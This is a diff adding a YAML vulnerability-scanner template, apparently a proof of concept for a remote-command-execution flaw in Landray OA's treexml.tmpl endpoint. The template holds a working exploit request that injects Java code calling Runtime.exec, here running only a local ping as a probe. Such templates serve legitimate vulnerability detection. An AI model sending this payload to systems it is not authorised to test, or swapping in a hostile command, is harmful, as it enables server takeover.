@@ -1,0 +1,23 @@
+id: poc-yaml-landray-treexml-rce
+info:
+  name: 蓝凌OA treexml.tmpl 命令执行
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 蓝凌OA
+requests:
+- method: POST
+  path: /data/sys-common/treexml.tmpl
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: s_bean=ruleFormulaValidate&script=try {String cmd = "ping 127.0.0.1";Process
+    child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
+  expression: 'contains(body, "</RestResponse>") && contains(body, "<RestResponse>")
+    && contains(body, "<RestResponse>")
+
+    && contains(body, "<success>true</success>")
+
+    '
+variables: {}
+transport: http
